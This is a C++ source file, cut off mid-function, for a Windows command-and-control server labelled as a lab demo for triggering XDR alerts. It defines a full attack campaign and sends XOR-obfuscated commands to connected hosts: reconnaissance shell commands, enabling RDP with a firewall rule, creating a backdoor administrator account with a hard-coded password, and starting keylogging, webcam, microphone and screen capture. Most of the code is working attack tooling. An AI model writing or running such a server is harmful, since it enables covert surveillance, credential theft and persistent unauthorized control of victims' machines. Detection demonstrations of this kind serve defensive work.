// cnc_server.cpp : Advanced Command & Control Server for Palo Alto Networks Lab Demo
        // FOR ISOLATED LAB ENVIRONMENT ONLY - Educational/Demo Purpose
        // This will generate comprehensive XDR alerts for customer demonstrations

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <atomic>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <random>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")

// Server configuration
#define C2_PORT 443          // Use HTTPS port for stealth
#define BACKUP_PORT 8443     // Fallback port
#define DNS_PORT 53          // DNS tunneling port
#define MAX_CLIENTS 10
#define BEACON_INTERVAL 10   // Rapid beaconing for demo

// Advanced configuration
#define ENABLE_ENCRYPTION true
#define ENABLE_PERSISTENCE true
#define ENABLE_EVASION true

// Global variables
std::atomic<bool> serverRunning(true);
    std::mutex logMutex;
    std::mutex clientsMutex;
    int totalCommandsSent = 0;
    std::string serverStartTime = std::to_string(std::time(nullptr));
    std::random_device rd;
    std::mt19937 gen(rd());
    std::vector<std::string> activityLog;

    // Enhanced client information
    struct ClientInfo {
        SOCKET socket;
        std::string ipAddress;
        std::string hostname;
        std::string username;
        std::string osVersion;
        std::string machineGuid;
        std::chrono::system_clock::time_point firstSeen;
        std::chrono::system_clock::time_point lastSeen;
        bool isActive;
        bool isElevated;
        int beaconCount;
        std::vector<std::string> executedCommands;
        std::map<std::string, std::string> collectedData;
        std::vector<std::string> installedPersistence;
    };

    // Global map to store connected clients (must be after ClientInfo definition)
    std::map<std::string, ClientInfo> connectedClients;
    
    // Test execution tracking
    struct TestStatus {
        bool initialCompromiseComplete = false;
        bool footholdComplete = false;
        bool privEscComplete = false;
        bool defenseEvasionComplete = false;
        bool surveillanceComplete = false;
        bool discoveryComplete = false;
        bool lateralMovementComplete = false;
        bool collectionComplete = false;
        bool exfiltrationComplete = false;
        bool impactComplete = false;
        std::chrono::steady_clock::time_point startTime;
        std::chrono::steady_clock::time_point lastTestTime;
    };
    
    std::map<std::string, TestStatus> clientTestStatus;

    // Enhanced command types for comprehensive XDR triggering
    enum CommandType {
        // Basic C2
        CMD_BEACON = 0x01,
        CMD_HEARTBEAT = 0x02,

        // Reconnaissance
        CMD_SYSINFO = 0x10,
        CMD_PROCESS_LIST = 0x11,
        CMD_NETWORK_CONFIG = 0x12,
        CMD_USER_ENUM = 0x13,
        CMD_DOMAIN_INFO = 0x14,
        CMD_SOFTWARE_ENUM = 0x15,

        // Collection
        CMD_SCREENSHOT = 0x20,
        CMD_KEYLOG_START = 0x21,
        CMD_KEYLOG_DUMP = 0x22,
        CMD_CLIPBOARD = 0x23,
        CMD_BROWSER_CREDS = 0x24,
        CMD_FILE_SEARCH = 0x25,
        CMD_WEBCAM_CAPTURE = 0x26,
        CMD_MICROPHONE_RECORD = 0x27,
        CMD_SCREEN_RECORD = 0x28,

        // Execution
        CMD_SHELL_EXEC = 0x30,
        CMD_POWERSHELL = 0x31,
        CMD_INJECT_PROCESS = 0x32,
        CMD_LOAD_MODULE = 0x33,
        CMD_MIGRATE_PROCESS = 0x34,
        CMD_REVERSE_SHELL = 0x35,
        CMD_REMOTE_DESKTOP = 0x36,

        // Persistence
        CMD_INSTALL_SERVICE = 0x40,
        CMD_REGISTRY_PERSIST = 0x41,
        CMD_SCHEDULED_TASK = 0x42,
        CMD_WMI_PERSIST = 0x43,
        CMD_STARTUP_FOLDER = 0x44,
        CMD_BOOTKIT_INSTALL = 0x45,

        // Lateral Movement
        CMD_PORT_SCAN = 0x50,
        CMD_SMB_SCAN = 0x51,
        CMD_PSEXEC = 0x52,
        CMD_WMI_EXEC = 0x53,
        CMD_RDP_EXEC = 0x54,
        CMD_PASS_THE_HASH = 0x55,
        CMD_MIMIKATZ_EXEC = 0x56,

        // Privilege Escalation
        CMD_UAC_BYPASS = 0x60,
        CMD_TOKEN_STEAL = 0x61,
        CMD_EXPLOIT_SUGGESTER = 0x62,
        CMD_LSASS_DUMP = 0x63,
        CMD_SAM_DUMP = 0x64,

        // Defense Evasion
        CMD_DISABLE_AV = 0x70,
        CMD_CLEAR_LOGS = 0x71,
        CMD_TIMESTOMP = 0x72,
        CMD_PROCESS_HOLLOW = 0x73,
        CMD_ROOTKIT_INSTALL = 0x74,
        CMD_AMSI_BYPASS = 0x75,
        CMD_ETW_DISABLE = 0x76,

        // Exfiltration
        CMD_STAGE_FILES = 0x80,
        CMD_COMPRESS_DATA = 0x81,
        CMD_EXFIL_HTTP = 0x82,
        CMD_EXFIL_DNS = 0x83,
        CMD_EXFIL_ICMP = 0x84,
        CMD_EXFIL_EMAIL = 0x85,
        CMD_CLOUD_UPLOAD = 0x86,

        // Impact
        CMD_RANSOMWARE = 0x90,
        CMD_WIPE_DISK = 0x91,
        CMD_CORRUPT_BOOT = 0x92,
        CMD_CRYPTO_MINER = 0x93,
        
        // Advanced Network Evasion
        CMD_TOR_CONNECT = 0xA0,
        CMD_TOR_API_CALL = 0xA1,
        CMD_REVERSE_SSH = 0xA2,
        CMD_NETCAT_TUNNEL = 0xA3,
        CMD_SOCAT_RELAY = 0xA4
    };

    // Global command queue for coordinated attacks
    std::map<std::string, std::vector<CommandType>> clientCommandQueue;

    // Forward declarations
    std::string getCommandName(CommandType cmd);
    void logActivity(const std::string& category, const std::string& type, const std::string& message);
    void executeAttackPhase(const std::string& clientId, int phase);
    void generateDNSBeacon(const std::string& serverIP, const std::string& clientIP);

    // XOR encryption for C2 traffic
    std::string xorEncrypt(const std::string & data, const std::string & key = "PaloAltoEscapeRoom") {
        std::string encrypted = data;
        for (size_t i = 0; i < data.size(); ++i) {
            encrypted[i] = data[i] ^ key[i % key.size()];
        }
        return encrypted;
    }
    
    // Generate session ID for C2 tracking
    std::string generateSessionId() {
        std::stringstream ss;
        ss << std::hex << std::time(nullptr) << "-" << std::rand() % 10000;
        return ss.str();
    }
    
    // Get current time as string
    std::string getCurrentTimeString() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        struct tm timeinfo;
        localtime_s(&timeinfo, &time_t);
        char timeStr[100];
        strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &timeinfo);
        return std::string(timeStr);
    }
    
    // Generate random string for C2 patterns
    std::string generateRandomString(size_t length) {
        const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        std::string result;
        result.reserve(length);
        for (size_t i = 0; i < length; i++) {
            result += charset[std::rand() % (sizeof(charset) - 1)];
        }
        return result;
    }
    
    // Base64 decode function
    std::vector<unsigned char> base64Decode(const std::string& encoded) {
        const std::string base64_chars = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789+/";
        
        std::vector<unsigned char> decoded;
        int val = 0, valb = -8;
        
        for (unsigned char c : encoded) {
            if (c == '=') break;
            if (c == '\n' || c == '\r' || c == ' ') continue;
            
            auto pos = base64_chars.find(c);
            if (pos == std::string::npos) continue;
            
            val = (val << 6) + pos;
            valb += 6;
            
            if (valb >= 0) {
                decoded.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        
        return decoded;
    }

    // Enhanced logging with categories
    void logActivity(const std::string & category, const std::string & type, const std::string & message) {
        std::lock_guard<std::mutex> lock(logMutex);

        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);

        struct tm timeinfo;
        localtime_s(&timeinfo, &time_t);

        char timeStr[100];
        strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &timeinfo);

        // Console output with color coding
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

        // Enhanced color coding for better visibility
        if (category == "ATTACK") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
        }
        else if (category == "C2") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        }
        else if (category == "LATERAL") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        }
        else if (category == "COLLECTION") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        }
        else if (category == "DEFENSE_EVASION") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        }
        else if (category == "PERSISTENCE") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        }

        // Format message with clear structure
        std::cout << "[" << timeStr << "] ";
        std::cout << "[" << std::left << std::setw(15) << category << "] ";
        std::cout << "[" << std::left << std::setw(20) << type << "] ";
        std::cout << message << std::endl;

        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        
        // Store formatted entry for dashboard
        std::stringstream logEntry;
        logEntry << "[" << category << "] " << type << ": " << message;
        activityLog.push_back(logEntry.str());
        
        // Keep only last 100 entries
        if (activityLog.size() > 100) {
            activityLog.erase(activityLog.begin());
        }

        // Detailed file logging
        std::ofstream logFile("C:\\temp\\c2_server_detailed.log", std::ios::app);
        if (logFile.is_open()) {
            logFile << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
            logFile.close();
        }

        // Separate attack log for XDR correlation
        if (category == "ATTACK" || category == "LATERAL" || category == "EXFIL") {
            std::ofstream attackLog("C:\\temp\\attack_timeline.log", std::ios::app);
            if (attackLog.is_open()) {
                attackLog << "[" << timeStr << "] " << type << " | " << message << std::endl;
                attackLog.close();
            }
        }
    }

    // Write C2 status to file for web dashboard integration
    void writeC2StatusToFile() {
        // Create directories if they don't exist
        CreateDirectoryA("C:\\Windows\\Temp\\C2_Bots", NULL);
        
        // Count active connections
        int activeCount = 0;
        for (const auto& [id, client] : connectedClients) {
            if (client.isActive) activeCount++;
        }
        
        // Write main status file
        std::ofstream statusFile("C:\\Windows\\Temp\\C2_Status.json");
        if (statusFile.is_open()) {
            statusFile << "{\n";
            statusFile << "  \"server_status\": \"active\",\n";
            statusFile << "  \"total_bots\": " << connectedClients.size() << ",\n";
            statusFile << "  \"active_bots\": " << activeCount << ",\n";
            statusFile << "  \"total_commands\": " << totalCommandsSent << ",\n";
            statusFile << "  \"server_start_time\": \"" << serverStartTime << "\",\n";
            statusFile << "  \"last_update\": \"" << std::time(nullptr) << "\"\n";
            statusFile << "}\n";
            statusFile.close();
        }
        
        // Write individual bot files
        for (const auto& [clientId, client] : connectedClients) {
            std::string safeId = clientId;
            // Replace : with _ for filename
            size_t pos = safeId.find(':');
            if (pos != std::string::npos) {
                safeId = safeId.substr(0, pos);
            }
            
            std::string botFile = "C:\\Windows\\Temp\\C2_Bots\\" + safeId + ".json";
            std::ofstream bot(botFile);
            if (bot.is_open()) {
                // Get last seen as timestamp
                auto lastSeenTime = std::chrono::system_clock::to_time_t(client.lastSeen);
                auto connectTime = std::chrono::system_clock::to_time_t(client.firstSeen);
                
                bot << "{\n";
                bot << "  \"id\": \"" << safeId << "\",\n";
                bot << "  \"ip\": \"" << client.ipAddress << "\",\n";
                bot << "  \"hostname\": \"" << client.hostname << "\",\n";
                bot << "  \"username\": \"" << client.username << "\",\n";
                bot << "  \"os\": \"" << client.osVersion << "\",\n";
                bot << "  \"status\": \"" << (client.isActive ? "active" : "offline") << "\",\n";
                bot << "  \"elevated\": " << (client.isElevated ? "true" : "false") << ",\n";
                bot << "  \"last_seen\": " << lastSeenTime << ",\n";
                bot << "  \"connect_time\": " << connectTime << ",\n";
                bot << "  \"commands_executed\": " << client.executedCommands.size() << ",\n";
                bot << "  \"beacon_count\": " << client.beaconCount << ",\n";
                bot << "  \"guid\": \"" << client.machineGuid << "\"\n";
                bot << "}\n";
                bot.close();
            }
        }
    }

    // Enhanced command sending with proper data request
    void generateC2Traffic(SOCKET clientSocket, const std::string & clientId, CommandType cmd) {
        // Build C2 packet with realistic structure
#pragma pack(push, 1)
        struct C2Packet {
            uint32_t signature;      // 0xC2ESCAPE
            uint16_t version;         // Protocol version
            uint16_t flags;           // Encryption, compression flags
            uint32_t sessionId;       // Unique session ID
            uint16_t commandId;       // Command to execute
            uint16_t sequenceNum;     // Packet sequence
            uint32_t payloadSize;     // Size of payload
            uint32_t checksum;        // Packet checksum
        };
#pragma pack(pop)

        C2Packet packet;
        packet.signature = 0xC2E5CA9E;
        packet.version = 0x0200;  // Version 2.0
        packet.flags = 0x0011;     // Encrypted | Compressed
        packet.sessionId = std::hash<std::string>{}(clientId);
        packet.commandId = cmd;
        packet.sequenceNum = rand() % 65535;
        packet.payloadSize = 0;
        packet.checksum = 0xDEADBEEF;

        // Send encrypted packet
        std::string encryptedPacket = xorEncrypt(std::string((char*)&packet, sizeof(packet)));
        int bytesSent = send(clientSocket, encryptedPacket.c_str(), encryptedPacket.size(), 0);

        // Log the command with debug info
        std::string cmdName = getCommandName(cmd);
        
        // Enhanced visibility of commands being sent
        std::cout << "\n\033[1;33m[!] SENDING COMMAND: " << cmdName << " (ID: " << cmd << ") to " << clientId << "\033[0m" << std::endl;
        
        logActivity("DEBUG", "COMMAND_PACKET_SENT", "Sent " + cmdName + " packet to " + clientId + " - Bytes: " + std::to_string(bytesSent) + " - Command ID: " + std::to_string(cmd));
        logActivity("C2", "COMMAND_SENT", "Sent " + cmdName + " to " + clientId);
        
        // Send additional text command for better client compatibility
        std::string textCommand = "CMD:" + cmdName + ":REQUEST_DATA\n";
        std::string encryptedText = xorEncrypt(textCommand);
        int textBytesSent = send(clientSocket, encryptedText.c_str(), encryptedText.size(), 0);
        
        logActivity("DEBUG", "TEXT_COMMAND_SENT", "Sent text command to " + clientId + " - Command: " + textCommand + " - Bytes: " + std::to_string(textBytesSent));
        
        // Increment command counter
        totalCommandsSent++;
    }

    // Get command name for logging
    std::string getCommandName(CommandType cmd) {
        switch (cmd) {
        case CMD_BEACON: return "BEACON";
        case CMD_SYSINFO: return "SYSTEM_INFO_COLLECTION";
        case CMD_PROCESS_LIST: return "PROCESS_ENUMERATION";
        case CMD_SCREENSHOT: return "SCREENSHOT_CAPTURE";
        case CMD_KEYLOG_START: return "KEYLOGGER_ACTIVATION";
        case CMD_KEYLOG_DUMP: return "KEYLOGGER_DATA_RETRIEVAL";
        case CMD_BROWSER_CREDS: return "CREDENTIAL_THEFT";
        case CMD_WEBCAM_CAPTURE: return "WEBCAM_ACTIVATION";
        case CMD_MICROPHONE_RECORD: return "MICROPHONE_RECORDING";
        case CMD_SCREEN_RECORD: return "SCREEN_RECORDING";
        case CMD_SHELL_EXEC: return "REMOTE_SHELL_EXECUTION";
        case CMD_POWERSHELL: return "POWERSHELL_EXECUTION";
        case CMD_INJECT_PROCESS: return "PROCESS_INJECTION";
        case CMD_REVERSE_SHELL: return "REVERSE_SHELL_CONNECTION";
        case CMD_REMOTE_DESKTOP: return "REMOTE_DESKTOP_ACCESS";
        case CMD_REGISTRY_PERSIST: return "REGISTRY_PERSISTENCE";
        case CMD_SCHEDULED_TASK: return "SCHEDULED_TASK_PERSISTENCE";
        case CMD_WMI_PERSIST: return "WMI_EVENT_PERSISTENCE";
        case CMD_BOOTKIT_INSTALL: return "BOOTKIT_INSTALLATION";
        case CMD_PORT_SCAN: return "NETWORK_PORT_SCANNING";
        case CMD_SMB_SCAN: return "SMB_SHARE_ENUMERATION";
        case CMD_PSEXEC: return "PSEXEC_LATERAL_MOVEMENT";
        case CMD_WMI_EXEC: return "WMI_REMOTE_EXECUTION";
        case CMD_PASS_THE_HASH: return "PASS_THE_HASH_ATTACK";
        case CMD_MIMIKATZ_EXEC: return "MIMIKATZ_CREDENTIAL_DUMP";
        case CMD_UAC_BYPASS: return "UAC_BYPASS_ATTEMPT";
        case CMD_LSASS_DUMP: return "LSASS_MEMORY_DUMP";
        case CMD_SAM_DUMP: return "SAM_DATABASE_DUMP";
        case CMD_DISABLE_AV: return "ANTIVIRUS_DISABLING";
        case CMD_CLEAR_LOGS: return "LOG_CLEARING";
        case CMD_PROCESS_HOLLOW: return "PROCESS_HOLLOWING";
        case CMD_ROOTKIT_INSTALL: return "ROOTKIT_INSTALLATION";
        case CMD_AMSI_BYPASS: return "AMSI_BYPASS_ATTEMPT";
        case CMD_ETW_DISABLE: return "ETW_PROVIDER_DISABLING";
        case CMD_EXFIL_HTTP: return "HTTP_DATA_EXFILTRATION";
        case CMD_EXFIL_DNS: return "DNS_TUNNELING_EXFILTRATION";
        case CMD_EXFIL_EMAIL: return "EMAIL_DATA_EXFILTRATION";
        case CMD_CLOUD_UPLOAD: return "CLOUD_STORAGE_UPLOAD";
        case CMD_RANSOMWARE: return "RANSOMWARE_DEPLOYMENT";
        case CMD_CRYPTO_MINER: return "CRYPTOCURRENCY_MINING";
        case CMD_TOR_CONNECT: return "TOR_NETWORK_CONNECTION";
        case CMD_TOR_API_CALL: return "TOR_EXIT_NODE_API_CALL";
        case CMD_REVERSE_SSH: return "REVERSE_SSH_TUNNEL";
        case CMD_NETCAT_TUNNEL: return "NETCAT_TUNNEL_ESTABLISHED";
        case CMD_SOCAT_RELAY: return "SOCAT_RELAY_ACTIVATED";
        default: return "UNKNOWN_COMMAND";
        }
    }

    // Execute attack campaign phases
    void executeAttackPhase(const std::string & clientId, int phase) {
        std::vector<CommandType> phaseCommands;
        std::string phaseName;
        std::string phaseDescription;

        switch (phase) {
        case 0: // Initial Compromise
            phaseCommands = { CMD_BEACON, CMD_SYSINFO, CMD_PROCESS_LIST, CMD_NETWORK_CONFIG };
            phaseName = "INITIAL_COMPROMISE";
            phaseDescription = "Gathering system information and establishing initial foothold";
            logActivity("ATTACK", phaseName, "=== PHASE 0: " + phaseDescription + " on " + clientId + " ===");
            logActivity("ATTACK", "COMMANDS", "Executing: BEACON, SYSINFO, PROCESS_LIST, NETWORK_CONFIG");
            break;

        case 1: // Establish Foothold
            phaseCommands = { CMD_REGISTRY_PERSIST, CMD_SCHEDULED_TASK, CMD_WMI_PERSIST, CMD_STARTUP_FOLDER };
            phaseName = "ESTABLISH_FOOTHOLD";
            phaseDescription = "Installing multiple persistence mechanisms";
            logActivity("PERSISTENCE", phaseName, "=== PHASE 1: " + phaseDescription + " on " + clientId + " ===");
            logActivity("PERSISTENCE", "COMMANDS", "Executing: REGISTRY_PERSIST, SCHEDULED_TASK, WMI_PERSIST, STARTUP_FOLDER");
            break;

        case 2: // Escalate Privileges
            phaseCommands = { CMD_UAC_BYPASS, CMD_TOKEN_STEAL, CMD_LSASS_DUMP, CMD_MIMIKATZ_EXEC, CMD_SAM_DUMP };
            phaseName = "PRIVILEGE_ESCALATION";
            phaseDescription = "Attempting to gain SYSTEM/Administrator privileges";
            logActivity("ATTACK", phaseName, "=== PHASE 2: " + phaseDescription + " on " + clientId + " ===");
            logActivity("ATTACK", "COMMANDS", "Executing: UAC_BYPASS, TOKEN_STEAL, LSASS_DUMP, MIMIKATZ, SAM_DUMP");
            break;

        case 3: // Defense Evasion
            phaseCommands = { CMD_DISABLE_AV, CMD_CLEAR_LOGS, CMD_AMSI_BYPASS, CMD_ETW_DISABLE, CMD_PROCESS_HOLLOW,
                             CMD_TOR_CONNECT, CMD_TOR_API_CALL, CMD_REVERSE_SSH, CMD_NETCAT_TUNNEL, CMD_SOCAT_RELAY };
            phaseName = "DEFENSE_EVASION";
            phaseDescription = "Disabling security controls, clearing traces, and establishing covert channels";
            logActivity("DEFENSE_EVASION", phaseName, "=== PHASE 3: " + phaseDescription + " on " + clientId + " ===");
            logActivity("DEFENSE_EVASION", "COMMANDS", "Executing: DISABLE_AV, CLEAR_LOGS, AMSI_BYPASS, ETW_DISABLE, PROCESS_HOLLOW, TOR_CONNECT, REVERSE_SSH");
            break;

        case 4: // Credential Access & Surveillance
            phaseCommands = { CMD_KEYLOG_START, CMD_BROWSER_CREDS, CMD_WEBCAM_CAPTURE, CMD_MICROPHONE_RECORD, CMD_SCREEN_RECORD };
            phaseName = "SURVEILLANCE";
            phaseDescription = "Activating comprehensive surveillance and credential theft";
            logActivity("COLLECTION", phaseName, "=== PHASE 4: " + phaseDescription + " on " + clientId + " ===");
            logActivity("COLLECTION", "COMMANDS", "Executing: KEYLOGGER, BROWSER_CREDS, WEBCAM, MICROPHONE, SCREEN_RECORD");
            break;

        case 5: // Discovery
            phaseCommands = { CMD_USER_ENUM, CMD_DOMAIN_INFO, CMD_SOFTWARE_ENUM, CMD_FILE_SEARCH };
            phaseName = "DISCOVERY";
            phaseDescription = "Mapping network environment and sensitive data";
            logActivity("ATTACK", phaseName, "=== PHASE 5: " + phaseDescription + " on " + clientId + " ===");
            logActivity("ATTACK", "COMMANDS", "Executing: USER_ENUM, DOMAIN_INFO, SOFTWARE_ENUM, FILE_SEARCH");
            break;

        case 6: // Lateral Movement & Remote Access
            phaseCommands = { CMD_PORT_SCAN, CMD_SMB_SCAN, CMD_PSEXEC, CMD_REVERSE_SHELL, CMD_REMOTE_DESKTOP };
            logActivity("LATERAL", "LATERAL_MOVEMENT", "Spreading and establishing remote access from " + clientId);
            break;

        case 7: // Collection
            phaseCommands = { CMD_SCREENSHOT, CMD_KEYLOG_DUMP, CMD_FILE_SEARCH, CMD_STAGE_FILES, CMD_CLIPBOARD };
            logActivity("ATTACK", "COLLECTION", "Collecting sensitive data on " + clientId);
            break;

        case 8: // Exfiltration
            phaseCommands = { CMD_COMPRESS_DATA, CMD_EXFIL_HTTP, CMD_EXFIL_DNS, CMD_EXFIL_EMAIL, CMD_CLOUD_UPLOAD };
            logActivity("EXFIL", "DATA_EXFILTRATION", "Exfiltrating data from " + clientId);
            break;

        case 9: // Impact
            phaseCommands = { CMD_RANSOMWARE, CMD_CRYPTO_MINER, CMD_BOOTKIT_INSTALL };
            logActivity("ATTACK", "IMPACT", "Deploying impact payloads on " + clientId);
            break;
        }

        // Queue commands for client
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clientCommandQueue[clientId] = phaseCommands;
        }
    }

    // Remote Shell Handler
    void executeRemoteShell(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "REMOTE_SHELL", "Establishing remote shell on " + clientId);

        // Send shell initialization
        std::string shellInit = "SHELL:INIT:cmd.exe\n";
        send(clientSocket, xorEncrypt(shellInit).c_str(), shellInit.size(), 0);

        // Shell commands to execute
        std::vector<std::string> shellCommands = {
            "whoami /all",
            "net user",
            "net localgroup administrators",
            "ipconfig /all",
            "netstat -an",
            "tasklist /v",
            "wmic process list brief",
            "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "dir C:\\Users\\*\\Desktop\\*.doc* /s",
            "systeminfo",
            "net share",
            "net use",
            "arp -a"
        };

        for (const auto& cmd : shellCommands) {
            std::string shellCmd = "SHELL:EXEC:" + cmd + "\n";
            send(clientSocket, xorEncrypt(shellCmd).c_str(), shellCmd.size(), 0);
            logActivity("ATTACK", "SHELL_CMD", "Executed: " + cmd);
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    }

    // Remote Desktop Handler
    void executeRemoteDesktop(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "RDP_ACCESS", "Initiating Remote Desktop takeover on " + clientId);

        // RDP initialization commands
        std::string rdpInit = "RDP:ENABLE:3389\n";
        send(clientSocket, xorEncrypt(rdpInit).c_str(), rdpInit.size(), 0);

        // Enable RDP through registry
        std::string enableRDP = "REG:ADD:HKLM\\System\\CurrentControlSet\\Control\\Terminal Server:fDenyTSConnections:0\n";
        send(clientSocket, xorEncrypt(enableRDP).c_str(), enableRDP.size(), 0);

        // Add firewall rule
        std::string fwRule = "SHELL:EXEC:netsh advfirewall firewall add rule name=\"RDP Access\" dir=in action=allow protocol=TCP localport=3389\n";
        send(clientSocket, xorEncrypt(fwRule).c_str(), fwRule.size(), 0);

        // Create backdoor user
        std::string addUser = "SHELL:EXEC:net user EscapeRoomAdmin P@ssw0rd123! /add\n";
        send(clientSocket, xorEncrypt(addUser).c_str(), addUser.size(), 0);

        std::string addToRDP = "SHELL:EXEC:net localgroup \"Remote Desktop Users\" EscapeRoomAdmin /add\n";
        send(clientSocket, xorEncrypt(addToRDP).c_str(), addToRDP.size(), 0);

        logActivity("ATTACK", "RDP_BACKDOOR", "RDP backdoor created - User: EscapeRoomAdmin");
    }

    // Enhanced Keylogger Implementation
    void executeKeylogger(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "KEYLOGGER", "Activating keylogger on " + clientId);

        // Ensure keylogs directory exists
        CreateDirectoryA("C:\\Windows\\Temp\\C2_Keylogs", NULL);

        // Send multiple keylogger start commands
        std::vector<std::string> commands = {
            "KEYLOG:START:HOOK\n",
            "KEYLOGGER:ACTIVATE:SEND\n",
            "CMD:KEYLOG:START\n",
            "START_KEYLOGGER_WITH_TRANSFER\n"
        };
        
        for (const auto& cmd : commands) {
            std::string encrypted = xorEncrypt(cmd);
            int bytesSent = send(clientSocket, encrypted.c_str(), encrypted.size(), 0);
            logActivity("DEBUG", "KEYLOG_CMD_SENT", "Sent: " + cmd.substr(0, cmd.length()-1) + " - Bytes: " + std::to_string(bytesSent));
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("ATTACK", "KEYLOG_START", "Keylogger commands sent to " + clientId + " - waiting for real keystrokes");
        
        // Also send C2 packet
        generateC2Traffic(clientSocket, clientId, CMD_KEYLOG_START);
    }
    
    // Enhanced Keylogger dump handler
    void executeKeyloggerDump(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "KEYLOG_DUMP", "Requesting keylogger data dump from " + clientId);
        
        // Send multiple dump request formats
        std::vector<std::string> commands = {
            "KEYLOG:DUMP\n",
            "KEYLOG:DUMP:SEND\n",
            "KEYLOGGER:RETRIEVE:DATA\n",
            "CMD:KEYLOG:DUMP\n",
            "DUMP_KEYLOG_DATA_NOW\n"
        };
        
        for (const auto& cmd : commands) {
            std::string encrypted = xorEncrypt(cmd);
            int bytesSent = send(clientSocket, encrypted.c_str(), encrypted.size(), 0);
            logActivity("DEBUG", "KEYLOG_DUMP_CMD", "Sent: " + cmd.substr(0, cmd.length()-1) + " - Bytes: " + std::to_string(bytesSent));
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        // Also send C2 packet
        generateC2Traffic(clientSocket, clientId, CMD_KEYLOG_DUMP);
        
        // Request immediate response
        std::string responseRequest = "RESPOND:KEYLOG:STATUS\n";
        std::string encryptedReq = xorEncrypt(responseRequest);
        send(clientSocket, encryptedReq.c_str(), encryptedReq.size(), 0);
        logActivity("DEBUG", "KEYLOG_RESPONSE_REQUEST", "Requested keylog status from " + clientId);
    }

    // Webcam Capture Handler
    void executeWebcamCapture(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "WEBCAM", "Accessing webcam on " + clientId);

        // Send command to capture real webcam images
        std::string webcamCapture = "WEBCAM:CAPTURE\n";
        send(clientSocket, xorEncrypt(webcamCapture).c_str(), webcamCapture.size(), 0);
        
        logActivity("ATTACK", "WEBCAM_CAPTURE", "Webcam capture initiated on " + clientId + " - attempting to access real webcam device");
    }

    // Microphone Recording Handler
    void executeMicrophoneRecord(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "MICROPHONE", "Activating microphone on " + clientId);

        // Send command to record real audio
        std::string micRecord = "MIC:RECORD:START\n";
        send(clientSocket, xorEncrypt(micRecord).c_str(), micRecord.size(), 0);
        
        logActivity("ATTACK", "MIC_RECORD", "Microphone recording initiated on " + clientId + " - attempting to capture real audio");
    }

    // Screen Recording Handler
    void executeScreenRecord(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "SCREEN_RECORD", "Starting screen recording on " + clientId);

        // Send command to start real screen recording
        std::string startRecord = "SCREEN:RECORD:START\n";
        send(clientSocket, xorEncrypt(startRecord).c_str(), startRecord.size(), 0);
        
        logActivity("ATTACK", "SCREEN_RECORD_START", "Screen recording initiated on " + clientId + " - capturing real desktop activity");
    }
    
    // Enhanced Screenshot Handler with multiple command formats
    void executeScreenshotCapture(SOCKET clientSocket, const std::string & clientId) {
        logActivity("ATTACK", "SCREENSHOT", "Capturing screenshot on " + clientId);
        
        // Ensure screenshots directory exists
        CreateDirectoryA("C:\\Windows\\Temp\\C2_Screenshots", NULL);
        
        // Send multiple command formats to ensure client compatibility
        std::vector<std::string> commands = {
            "SCREEN:CAPTURE:TRANSFER\n",
            "SCREENSHOT:TAKE:SEND\n", 
            "CMD:SCREENSHOT:EXECUTE\n",
            "CAPTURE_SCREEN_AND_SEND\n"
        };
        
        for (const auto& cmd : commands) {
            std::string encrypted = xorEncrypt(cmd);
            int bytesSent = send(clientSocket, encrypted.c_str(), encrypted.size(), 0);
            logActivity("DEBUG", "SCREENSHOT_CMD_SENT", "Sent: " + cmd.substr(0, cmd.length()-1) + " - Bytes: " + std::to_string(bytesSent));
            
            // Small delay between commands
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        logActivity("ATTACK", "SCREENSHOT_CAPTURE", "Multiple screenshot commands sent to " + clientId);
        
        // Also trigger C2 packet
        generateC2Traffic(clientSocket, clientId, CMD_SCREENSHOT);
        
        // Request immediate response
        std::string responseRequest = "RESPOND:SCREENSHOT:STATUS\n";
